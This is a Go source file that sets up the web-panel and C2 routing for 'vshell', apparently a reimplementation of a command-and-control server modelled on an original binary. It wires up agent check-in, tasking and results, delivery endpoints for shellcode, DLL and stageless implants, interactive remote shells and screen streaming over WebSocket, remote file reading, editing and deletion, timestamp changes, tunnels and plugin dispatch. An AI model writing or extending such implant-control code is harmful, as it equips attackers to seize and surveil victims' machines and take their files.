// Package router 负责 Web 面板与 C2 协议的路由注册、JWT 认证中间件及 SPA 静态资源托管。
// Package router handles route registration for the web panel and C2 protocol,
// JWT auth middleware, and SPA static asset serving.
package router

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"

	"vshell/c2engine"
	"vshell/controllers"
	"vshell/utils"
)

// contextHandler 将控制器处理器包装为带标准 Context 的形式。
// contextHandler wraps a controller handler with standard context setup.
type contextHandler func(*controllers.Context)

// handle 构造一个填充 Context 并调用控制器的 HTTP 处理器。
// handle builds an HTTP handler that populates the Context and invokes the controller.
func handle(handler contextHandler) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		ctx := &controllers.Context{
			Request:        r,
			ResponseWriter: w,
		}
		handler(ctx)
	}
}

// controllerHandler 按 HTTP 方法分发到控制器对应的处理方法。
// controllerHandler dispatches to the appropriate method on a controller.
type controllerHandler struct {
	ctrl controllers.ControllerInterface
}

func (ch *controllerHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	ctx := &controllers.Context{
		Request:        r,
		ResponseWriter: w,
	}
	ch.ctrl.Init(ctx)
	ch.ctrl.Prepare()

	switch r.Method {
	case "GET":
		ch.ctrl.Get()
	case "POST":
		ch.ctrl.Post()
	case "PUT":
		ch.ctrl.Put()
	case "DELETE":
		ch.ctrl.Delete()
	case "HEAD":
		ch.ctrl.Head()
	case "PATCH":
		ch.ctrl.Patch()
	case "OPTIONS":
		ch.ctrl.Options()
	default:
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
	}
}

// InitRouter 初始化全部路由（SPA、认证、仪表盘、监听器、客户端、终端、文件、隧道等）。
// InitRouter initializes all routes (SPA, auth, dashboard, listeners, clients,
// terminal, files, tunnels, etc.).
func InitRouter() http.Handler {
	mux := http.NewServeMux()

	// Root - serve SPA index.html
	fs := http.FileServer(http.Dir("static"))
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		// Don't intercept API or C2 routes
		if strings.HasPrefix(r.URL.Path, "/api/") ||
			strings.HasPrefix(r.URL.Path, "/c2/") ||
			strings.HasPrefix(r.URL.Path, "/ws/") ||
			strings.HasPrefix(r.URL.Path, "/sw") ||
			strings.HasPrefix(r.URL.Path, "/install/") {
			http.NotFound(w, r)
			return
		}
		// Check if file exists in static directory (covers /assets/*, /static/*, etc.)
		staticPath := "static" + r.URL.Path
		if _, err := os.Stat(staticPath); err == nil && !strings.HasSuffix(r.URL.Path, "/") {
			// For JS modules, set proper MIME type
			if strings.HasSuffix(r.URL.Path, ".js") {
				w.Header().Set("Content-Type", "application/javascript; charset=utf-8")
			} else if strings.HasSuffix(r.URL.Path, ".css") {
				w.Header().Set("Content-Type", "text/css; charset=utf-8")
			}
			fs.ServeHTTP(w, r)
			return
		}
		// Missing /assets/* files must 404, NOT fall back to index.html:
		// returning HTML for a module script triggers a MIME-type error in the
		// browser which aborts the whole chunk graph.
		if strings.HasPrefix(r.URL.Path, "/assets/") {
			http.NotFound(w, r)
			return
		}
		// SPA fallback: serve index.html for client-side routing
		http.ServeFile(w, r, "static/index.html")
	})

	// == Auth routes (original binary format) ==
	loginCtrl := &controllers.LoginController{}
	mux.Handle("/login", &controllerHandler{loginCtrl})
	mux.Handle("/api/login", &controllerHandler{loginCtrl})
	mux.HandleFunc("/api/getUserInfo", handleGetUserInfo)
	mux.HandleFunc("/api/getMenuList", handleGetMenuList)
	mux.HandleFunc("/api/getPermCode", handleGetPermCode)

	// == Health routes ==
	healthCtrl := &controllers.HealthController{}
	mux.Handle("/health", &controllerHandler{healthCtrl})
	mux.Handle("/api/health", &controllerHandler{healthCtrl})

	mux.HandleFunc("/logout", handle(func(ctx *controllers.Context) {
		ctrl := &controllers.LoginController{}
		ctrl.Init(ctx)
		ctrl.Prepare()
		ctrl.Logout()
	}))

	// /api/logout — the SPA calls GET /api/logout on every page load to clear
	// any stale session. The original binary returns a JSON success here WITHOUT
	// requiring a valid token (the frontend calls it pre-login too). Must be
	// registered before the /api/ catch-all so it doesn't fall through to
	// ApiBaseController (which would 401 an unauthenticated logout).
	mux.HandleFunc("/api/logout", func(w http.ResponseWriter, r *http.Request) {
		// Clear any session state defensively, then answer JSON success.
		// A redirect would break the SPA's request layer, so return the
		// standard response envelope instead.
		w.Header().Set("Content-Type", "application/json; charset=utf-8")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"code":    0,
			"message": "ok",
			"type":    "success",
		})
	})

	// == Dashboard ==
	dashCtrl := &controllers.DashboardController{}
	mux.Handle("/dashboard", &controllerHandler{dashCtrl})
	mux.Handle("/api/dashboard/overview", &controllerHandler{dashCtrl})
	// Original binary path (frontend calls POST /api/dashboard/info)
	mux.Handle("/api/dashboard/info", &controllerHandler{dashCtrl})

	// == Listeners ==
	listenerCtrl := &controllers.ListenerController{}
	mux.Handle("/api/listeners", &controllerHandler{listenerCtrl})
	// REST-style routes matching original binary frontend (POST /api/listener/{action})
	mux.Handle("/api/listener/add", &controllers.ActionHandler{Ctrl: listenerCtrl, Action: "Add"})
	mux.Handle("/api/listener/edit", &controllers.ActionHandler{Ctrl: listenerCtrl, Action: "Edit"})
	mux.Handle("/api/listener/editremark", &controllers.ActionHandler{Ctrl: listenerCtrl, Action: "EditRemark"})
	mux.Handle("/api/listener/del", &controllers.ActionHandler{Ctrl: listenerCtrl, Action: "Del"})
	mux.Handle("/api/listener/dellist", &controllers.ActionHandler{Ctrl: listenerCtrl, Action: "Dellist"})
	mux.Handle("/api/listener/list", &controllers.ActionHandler{Ctrl: listenerCtrl, Action: "List"})
	mux.Handle("/api/listener/start", &controllers.ActionHandler{Ctrl: listenerCtrl, Action: "Start"})
	mux.Handle("/api/listener/stop", &controllers.ActionHandler{Ctrl: listenerCtrl, Action: "Stop"})

	// == Clients ==
	clientCtrl := &controllers.ClientController{}
	mux.Handle("/api/clients", &controllerHandler{clientCtrl})
	// REST-style client routes
	mux.Handle("/api/client/add", &controllers.ActionHandler{Ctrl: clientCtrl, Action: "Add"})
	mux.Handle("/api/client/list", &controllers.ActionHandler{Ctrl: clientCtrl, Action: "List"})
	mux.Handle("/api/client/editremark", &controllers.ActionHandler{Ctrl: clientCtrl, Action: "EditRemark"})
	mux.Handle("/api/client/dellist", &controllers.ActionHandler{Ctrl: clientCtrl, Action: "Dellist"})
	mux.Handle("/api/client/checkin", &controllers.ActionHandler{Ctrl: clientCtrl, Action: "CheckIn"})
	mux.Handle("/api/client/block", &controllers.ActionHandler{Ctrl: clientCtrl, Action: "Block"})
	mux.Handle("/api/client/unblock", &controllers.ActionHandler{Ctrl: clientCtrl, Action: "Unblock"})
	mux.Handle("/api/client/note", &controllers.ActionHandler{Ctrl: clientCtrl, Action: "Note"})

	// == C2 Agent API Routes (dynamic per listener) ==
	registerC2AgentRoutes(mux)

	// == Terminal ==
	termCtrl := &controllers.TerminalController{}
	mux.Handle("/terminal", &controllerHandler{termCtrl})
	mux.Handle("/api/terminal/resize", &controllers.ActionHandler{Ctrl: termCtrl, Action: "Resize"})
	mux.Handle("/api/terminal/shell", &controllers.ActionHandler{Ctrl: termCtrl, Action: "Shell"})

	// The SPA opens a REAL WebSocket at /api/terminal/ws?id=<client>&token=<jwt>
	// (and /api/screen/ws for screen streaming). Route both to the actual
	// WebSocket handlers — NOT the TerminalController.WS()/ScreenController.Ws()
	// action handlers, which return JSON ("terminal_start"/"screen_capture").
	mux.HandleFunc("/api/terminal/ws", controllers.HandleTerminalWebSocket)

	// WebSocket endpoint for real-time terminal
	mux.HandleFunc("/ws/terminal", controllers.HandleTerminalWebSocket)
	// WebSocket endpoint for screen streaming
	mux.HandleFunc("/ws/screen", controllers.HandleScreenWebSocket)

	// == Files ==
	fileCtrl := &controllers.FileController{}
	mux.Handle("/api/files", &controllerHandler{fileCtrl})
	mux.Handle("/api/file/ls", &controllers.ActionHandler{Ctrl: fileCtrl, Action: "Ls"})
	mux.Handle("/api/file/rm", &controllers.ActionHandler{Ctrl: fileCtrl, Action: "Rm"})
	mux.Handle("/api/file/rmlist", &controllers.ActionHandler{Ctrl: fileCtrl, Action: "RmList"})
	mux.Handle("/api/file/mv", &controllers.ActionHandler{Ctrl: fileCtrl, Action: "Mv"})
	mux.Handle("/api/file/cat", &controllers.ActionHandler{Ctrl: fileCtrl, Action: "Cat"})
	mux.Handle("/api/file/mkdir", &controllers.ActionHandler{Ctrl: fileCtrl, Action: "Mkdir"})
	mux.Handle("/api/file/touch", &controllers.ActionHandler{Ctrl: fileCtrl, Action: "Touch"})
	mux.Handle("/api/file/edit", &controllers.ActionHandler{Ctrl: fileCtrl, Action: "Edit"})
	mux.Handle("/api/file/modifytime", &controllers.ActionHandler{Ctrl: fileCtrl, Action: "Modifytime"})
	mux.Handle("/api/file/wget", &controllers.ActionHandler{Ctrl: fileCtrl, Action: "Wget"})
	mux.Handle("/api/file/upload", &controllers.ActionHandler{Ctrl: fileCtrl, Action: "Upload"})
	mux.Handle("/api/file/download", &controllers.ActionHandler{Ctrl: fileCtrl, Action: "Download"})
	mux.Handle("/api/file/downloadtobrowser", &controllers.ActionHandler{Ctrl: fileCtrl, Action: "DownloadToBrowser"})
	mux.Handle("/api/file/downloadtoserver", &controllers.ActionHandler{Ctrl: fileCtrl, Action: "DownloadToServer"})
	mux.Handle("/api/file/downloadtooss", &controllers.ActionHandler{Ctrl: fileCtrl, Action: "DownloadToOSS"})
	mux.Handle("/api/file/getdownloadper", &controllers.ActionHandler{Ctrl: fileCtrl, Action: "GetDownloadPer"})
	mux.Handle("/api/file/getdisk", &controllers.ActionHandler{Ctrl: fileCtrl, Action: "Getdisk"})
	mux.Handle("/api/file/disk", &controllers.ActionHandler{Ctrl: fileCtrl, Action: "Getdisk"})

	// == Downloads (agent generation + server-side) ==
	downloadCtrl := &controllers.DownloadController{}
	mux.Handle("/download", &controllerHandler{downloadCtrl})
	mux.Handle("/api/download/stage", &controllers.ActionHandler{Ctrl: downloadCtrl, Action: "Stage"})
	mux.Handle("/api/download/stageless", &controllers.ActionHandler{Ctrl: downloadCtrl, Action: "Stageless"})
	mux.Handle("/api/download/shellcode", &controllers.ActionHandler{Ctrl: downloadCtrl, Action: "Shellcode"})
	mux.Handle("/api/download/dll", &controllers.ActionHandler{Ctrl: downloadCtrl, Action: "Dll"})
	mux.Handle("/api/download/listen", &controllers.ActionHandler{Ctrl: downloadCtrl, Action: "Listen"})
	mux.Handle("/api/download/listen_dll", &controllers.ActionHandler{Ctrl: downloadCtrl, Action: "ListenDll"})
	// The SPA requests the Listen-DLL page as /api/download/listendll (no
	// underscore) — without this alias the page 401s via the /api/ catch-all.
	mux.Handle("/api/download/listendll", &controllers.ActionHandler{Ctrl: downloadCtrl, Action: "ListenDll"})

	// == Install/Plugins ==
	installCtrl := &controllers.InstallController{}
	mux.Handle("/api/plugins", &controllerHandler{installCtrl})
	mux.HandleFunc("/install/install", controllers.HandleServiceInstall)
	mux.HandleFunc("/install/remove", controllers.HandleServiceRemove)

	// Plugin dispatch & download endpoints
	mux.HandleFunc("/api/plugin/dispatch", controllers.HandlePluginDispatch)
	mux.HandleFunc("/api/plugin/download", controllers.HandlePluginDownload)
	mux.HandleFunc("/api/plugin/download_b64", controllers.HandlePluginDownloadB64)

	// == Tunnels ==
	tunnelCtrl := &controllers.TunnelController{}
	mux.Handle("/api/tunnels", &controllerHandler{tunnelCtrl})
	// REST-style tunnel routes
	mux.Handle("/api/tunnel/list", &controllers.ActionHandler{Ctrl: tunnelCtrl, Action: "List"})
	mux.Handle("/api/tunnel/add", &controllers.ActionHandler{Ctrl: tunnelCtrl, Action: "Add"})
	mux.Handle("/api/tunnel/edit", &controllers.ActionHandler{Ctrl: tunnelCtrl, Action: "Edit"})
	mux.Handle("/api/tunnel/editremark", &controllers.ActionHandler{Ctrl: tunnelCtrl, Action: "EditRemark"})
	mux.Handle("/api/tunnel/del", &controllers.ActionHandler{Ctrl: tunnelCtrl, Action: "Del"})
	mux.Handle("/api/tunnel/dellist", &controllers.ActionHandler{Ctrl: tunnelCtrl, Action: "Dellist"})
	mux.Handle("/api/tunnel/start", &controllers.ActionHandler{Ctrl: tunnelCtrl, Action: "Start"})
	mux.Handle("/api/tunnel/stop", &controllers.ActionHandler{Ctrl: tunnelCtrl, Action: "Stop"})

	// == Settings ==
	settingCtrl := &controllers.SettingController{}
	mux.Handle("/api/settings", &controllerHandler{settingCtrl})
	mux.Handle("/api/setting/get", &controllers.ActionHandler{Ctrl: settingCtrl, Action: "Get"})
	mux.Handle("/api/setting/edit", &controllers.ActionHandler{Ctrl: settingCtrl, Action: "Post"})

	// == Hosts ==
	hostCtrl := &controllers.HostController{}
	mux.Handle("/api/hosts", &controllerHandler{hostCtrl})
	mux.Handle("/api/host/list", &controllers.ActionHandler{Ctrl: hostCtrl, Action: "List"})
	mux.Handle("/api/host/add", &controllers.ActionHandler{Ctrl: hostCtrl, Action: "Add"})
	mux.Handle("/api/host/edit", &controllers.ActionHandler{Ctrl: hostCtrl, Action: "Edit"})
	mux.Handle("/api/host/del", &controllers.ActionHandler{Ctrl: hostCtrl, Action: "Del"})
	mux.Handle("/api/host/start", &controllers.ActionHandler{Ctrl: hostCtrl, Action: "Start"})
	mux.Handle("/api/host/stop", &controllers.ActionHandler{Ctrl: hostCtrl, Action: "Stop"})

	// == Screen ==
	screenCtrl := &controllers.ScreenController{}
	mux.Handle("/screen", &controllerHandler{screenCtrl})
	// The SPA opens a real WebSocket at /api/screen/ws?id=<client>&quality=<q>.
	mux.HandleFunc("/api/screen/ws", controllers.HandleScreenWebSocket)

	// == Screenshot ==
	screenshotCtrl := &controllers.ScreenshotController{}
	mux.Handle("/api/screenshot", &controllerHandler{screenshotCtrl})
	// Original binary path (frontend calls GET /api/screenshot/get?id=&quality=)
	mux.Handle("/api/screenshot/get", &controllers.ActionHandler{Ctrl: screenshotCtrl, Action: "Get"})

	// == Runner ==
	runnerCtrl := &controllers.RunnerController{}
	mux.Handle("/api/runner", &controllerHandler{runnerCtrl})
	mux.Handle("/api/runner/list", &controllers.ActionHandler{Ctrl: runnerCtrl, Action: "List"})
	mux.Handle("/api/runner/runplugin", &controllers.ActionHandler{Ctrl: runnerCtrl, Action: "RunPlugin"})
	mux.Handle("/api/runner/upload", &controllers.ActionHandler{Ctrl: runnerCtrl, Action: "Upload"})

	// == Session (agent sessions) ==
	sessionCtrl := &controllers.SessionControllerInterface{}
	mux.Handle("/api/sessions", &controllerHandler{sessionCtrl})

	// == API base ==
	apiCtrl := &controllers.ApiBaseController{}
	mux.Handle("/api/", &controllerHandler{apiCtrl})

	// == Agent Binary Delivery Endpoints (matching original binary) ==
	// /swt - TCP staged agent, /sww - WebSocket agent, /swk - KCP agent
	// /sws - Shellcode, /swd - DLL agent, /swl - Linux agent, /swld - Listen DLL
	mux.HandleFunc("/swt", controllers.HandleAgentDelivery("stage", "windows", "amd64"))
	mux.HandleFunc("/sww", controllers.HandleAgentDelivery("stageless", "windows", "amd64"))
	mux.HandleFunc("/swk", controllers.HandleAgentDelivery("stageless", "windows", "amd64"))
	mux.HandleFunc("/sws", controllers.HandleAgentDelivery("shellcode", "windows", "amd64"))
	mux.HandleFunc("/swd", controllers.HandleAgentDelivery("dll", "windows", "amd64"))
	mux.HandleFunc("/swl", controllers.HandleAgentDelivery("stageless", "linux", "amd64"))
	mux.HandleFunc("/swld", controllers.HandleAgentDelivery("listen_dll", "windows", "amd64"))

	// Static files
	mux.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("static"))))

	// Admin panel
	mux.HandleFunc("/admin", func(w http.ResponseWriter, r *http.Request) {
		http.ServeFile(w, r, "static/admin/index.html")
	})
	mux.HandleFunc("/admin/", func(w http.ResponseWriter, r *http.Request) {
		http.ServeFile(w, r, "static/admin/index.html")
	})

	return requireAPIAuth(mux)
}

// extractToken 从请求中提取 JWT：依次尝试 Token 头（SPA）、Authorization Bearer、X-Token、?token=。
// extractToken pulls the JWT from a request using every header/query form the
// SPA and API clients use: Token header (SPA), Authorization Bearer (compat),
// X-Token, then ?token=.
func extractToken(r *http.Request) string {
	if t := r.Header.Get("Token"); t != "" {
		return t
	}
	if auth := r.Header.Get("Authorization"); len(auth) > 7 && auth[:7] == "Bearer " {
		return auth[7:]
	}
	if t := r.Header.Get("X-Token"); t != "" {
		return t
	}
	return r.URL.Query().Get("token")
}

// requireAPIAuth 对 Web 面板 API 强制 JWT 认证。
//
// SPA（原版前端）登录后在每个 API 请求中通过 `Token` 头携带令牌，仅在登录前调用
// /api/login 与 /api/logout。此前所有控制器内嵌 BaseController，其 Prepare() 为空实现，
// 导致整个 API 可未认证访问——未认证攻击者可向在线 Agent 下发命令（RCE）、下载 Agent
// 二进制、读写设置与读取文件。
//
// 保护范围：除 login/logout/health 外的全部 /api/ 路径，以及服务安装/卸载端点。
// C2 Agent 协议（/c2/l/…）、Agent 二进制下发（/swt、/sww …）、静态资源与 SPA 页面
// 有意不包裹（它们按 verify-key 认证或本就是公开设计）。
// requireAPIAuth enforces JWT authentication on the web-panel API.
//
// The SPA (original binary frontend) sends the token as the `Token` header on
// every API request after login, and calls only /api/login and /api/logout
// before authenticating. Previously every controller embedded BaseController,
// whose Prepare() is a no-op, so the entire API was reachable unauthenticated —
// an unauthenticated attacker could dispatch commands to connected agents
// (RCE), download agent binaries, read/modify settings, and read files.
//
// Scope: every /api/ path except login/logout/health, plus the service
// install/remove endpoints. The C2 agent protocol (/c2/l/…), agent binary
// delivery (/swt, /sww, …), static assets and SPA pages are intentionally
// NOT wrapped (they authenticate by verify-key or are public by design).
func requireAPIAuth(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		path := r.URL.Path

		// Public endpoints the SPA calls without a token.
		if path == "/api/login" || path == "/api/logout" || path == "/api/health" || path == "/health" {
			next.ServeHTTP(w, r)
			return
		}

		// Agent-facing plugin download: agents fetch the plugin binary from the
		// C2 server during plugin execution (curl/certutil) and have no web JWT,
		// so these must not require panel auth.
		if path == "/api/plugin/download" || path == "/api/plugin/download_b64" {
			next.ServeHTTP(w, r)
			return
		}

		// Only the web-panel API is protected. The raw WS paths must also be
		// gated — they are the same terminal/screen handlers, reachable with
		// ?id=<client>, and would otherwise give anyone an unauthenticated
		// interactive shell on an agent.
		isAPI := strings.HasPrefix(path, "/api/") ||
			path == "/install/install" || path == "/install/remove" ||
			path == "/ws/terminal" || path == "/ws/screen"
		if !isAPI {
			next.ServeHTTP(w, r)
			return
		}

		// Extract token: Token header (SPA), Authorization Bearer (compat), ?token=.
		token := extractToken(r)
		if token == "" {
			http.Error(w, "", http.StatusUnauthorized)
			return
		}
		if _, err := utils.ValidateToken(token); err != nil {
			http.Error(w, "", http.StatusUnauthorized)
			return
		}
		next.ServeHTTP(w, r)
	})
}

// registerC2AgentRoutes 注册动态 C2 协议端点（/c2/l/{listenerID}/{action}）。
// registerC2AgentRoutes adds dynamic C2 protocol endpoints.
func registerC2AgentRoutes(mux *http.ServeMux) {
	// Dynamic paths for C2 listeners
	// /c2/l/{listenerID}/checkin, /c2/l/{listenerID}/tasks, /c2/l/{listenerID}/result
	mux.HandleFunc("/c2/l/", func(w http.ResponseWriter, r *http.Request) {
		path := strings.TrimPrefix(r.URL.Path, "/c2/l/")
		parts := strings.Split(path, "/")

		if len(parts) < 2 {
			http.Error(w, "invalid path", 400)
			return
		}

		// Extract listener ID
		var listenerID int64
		fmt.Sscanf(parts[0], "%d", &listenerID)
		action := parts[1]

		// Handle based on action
		engine := c2engine.GetEngine()
		listener := engine.GetListener(listenerID)
		verifyKey := ""
		if listener != nil {
			verifyKey = listener.VerifyKey
		}

		switch action {
		case "checkin":
			controllers.HandleC2Checkin(w, r, listenerID, verifyKey)
		case "tasks":
			controllers.HandleC2Tasks(w, r, listenerID)
		case "result":
			controllers.HandleC2Result(w, r, listenerID)
		default:
			http.Error(w, "unknown action", 404)
		}
	})
}

// basePath 提取 URL 的根路径段（辅助函数）。
// basePath extracts the root path segment of a URL (helper).
func basePath(path string) string {
	parts := strings.Split(strings.Trim(path, "/"), "/")
	if len(parts) > 0 {
		return parts[0]
	}
	return ""
}

// handleGetUserInfo 返回当前用户信息（SPA 使用）。
// 原版 v_windows_amd64.exe 的黑盒观测证据：
// handleGetUserInfo returns the current user's info (used by SPA)
// Black-box evidence from the original v_windows_amd64.exe:
//
//	GET /api/getUserInfo with valid JWT token header →
//	  {"code":0,"message":"ok","result":{
//	    "avatar":"","desc":"manager","homePath":"/dashboard/index",
//	    "realName":"admin","roles":[{"roleName":"Super Admin","value":"super"}],
//	    "token":"","userId":"1","username":"admin"},
//	  "type":"success"}
//
//	GET /api/getUserInfo with invalid token → HTTP 200
//	  {"code":401,"result":null}
//
//	GET /api/getUserInfo without token → HTTP 401, empty body
func handleGetUserInfo(w http.ResponseWriter, r *http.Request) {
	token := extractToken(r)

	if token == "" {
		http.Error(w, "", http.StatusUnauthorized)
		return
	}

	username, err := utils.ValidateToken(token)
	if err != nil {
		log.Printf("[getUserInfo] Invalid token: %v", err)
		// Original returns HTTP 200 with code 401 for an invalid token.
		w.Header().Set("Content-Type", "application/json; charset=utf-8")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"code":   401,
			"result": nil,
		})
		return
	}

	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	json.NewEncoder(w).Encode(utils.UserInfoResponse{
		Code:    0,
		Message: "ok",
		Type:    "success",
		Result: utils.UserInfo{
			Avatar:   "",
			UserID:   "1",
			Username: username,
			RealName: username,
			Desc:     "manager",
			HomePath: "/dashboard/index",
			Roles: []utils.RoleInfoResp{
				{RoleName: "Super Admin", Value: "super"},
			},
			Token: "",
		},
	})
}

// handleGetMenuList 返回导航菜单结构（与原版二进制一致），前端渲染侧边栏。
// handleGetMenuList returns the navigation menu structure (matching original binary).
// Frontend calls GET /api/getMenuList to render sidebar navigation.
func handleGetMenuList(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"code":    0,
		"message": "ok",
		"type":    "success",
		"result":  getDefaultMenuList(),
	})
}

// handleGetPermCode 返回 RBAC 权限码（与原版二进制一致），前端据此控制 UI 元素显隐。
// handleGetPermCode returns RBAC permission codes (matching original binary).
// Frontend calls GET /api/getPermCode to determine which UI elements to show.
func handleGetPermCode(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"code":    0,
		"message": "ok",
		"type":    "success",
		"result":  []string{"*"}, // super admin: all permissions
	})
}

// getDefaultMenuList 返回默认菜单列表。
// getDefaultMenuList returns the default navigation menu list.
func getDefaultMenuList() []map[string]interface{} {
	// NOTE: paths must match the compiled SPA routes (static route modules in
	// the embedded frontend), NOT guessed paths. The SPA's registered routes are
	// /dashboard/index, /client/list, /listener/list, /download/{index,stage,
	// stageless,listen,ebpf}, /pluginrunner/index, /tunnel/list, /setting/index,
	// /about/index, plus detail pages (/terminal/index, /filemanager/index,
	// /screen/index, /screenshot/index, /serviceInstall/index, /clientManager/
	// index). Previously this returned /client/index, /listener/index,
	// /file/index, /tunnel/index, /plugin/index and /host/index — routes the SPA
	// does NOT register — so any consumer building routes from this response
	// would resolve to the SPA's 404 catch-all.
	return []map[string]interface{}{
		{
			"name":      "Dashboard",
			"path":      "/dashboard/index",
			"icon":      "ion:grid-outline",
			"component": "LAYOUT",
			"children":  []map[string]interface{}{},
		},
		{
			"name":      "Clients",
			"path":      "/client/list",
			"icon":      "ion:people-outline",
			"component": "LAYOUT",
			"children":  []map[string]interface{}{},
		},
		{
			"name":      "Listeners",
			"path":      "/listener/list",
			"icon":      "ion:list-outline",
			"component": "LAYOUT",
			"children":  []map[string]interface{}{},
		},
		{
			"name":      "Terminal",
			"path":      "/terminal/index",
			"icon":      "ion:terminal-outline",
			"component": "LAYOUT",
			"children":  []map[string]interface{}{},
		},
		{
			"name":      "Files",
			"path":      "/filemanager/index",
			"icon":      "ion:folder-outline",
			"component": "LAYOUT",
			"children":  []map[string]interface{}{},
		},
		{
			"name":      "Tunnels",
			"path":      "/tunnel/list",
			"icon":      "ion:git-network-outline",
			"component": "LAYOUT",
			"children":  []map[string]interface{}{},
		},
		{
			"name":      "Downloads",
			"path":      "/download/index",
			"icon":      "ion:download-outline",
			"component": "LAYOUT",
			"children": []map[string]interface{}{
				{"name": "Stage", "path": "/download/stage", "icon": ""},
				{"name": "Stageless", "path": "/download/stageless", "icon": ""},
				{"name": "Listen", "path": "/download/listen", "icon": ""},
				{"name": "Ebpf", "path": "/download/ebpf", "icon": ""},
			},
		},
		{
			"name":      "Plugins",
			"path":      "/pluginrunner/index",
			"icon":      "ion:extension-puzzle-outline",
			"component": "LAYOUT",
			"children":  []map[string]interface{}{},
		},
		{
			"name":      "Screenshot",
			"path":      "/screenshot/index",
			"icon":      "ion:camera-outline",
			"component": "LAYOUT",
			"children":  []map[string]interface{}{},
		},
		{
			"name":      "Settings",
			"path":      "/setting/index",
			"icon":      "ion:settings-outline",
			"component": "LAYOUT",
			"children":  []map[string]interface{}{},
		},
		{
			"name":      "About",
			"path":      "/about/index",
			"icon":      "ion:information-circle-outline",
			"component": "LAYOUT",
			"children":  []map[string]interface{}{},
		},
	}
}
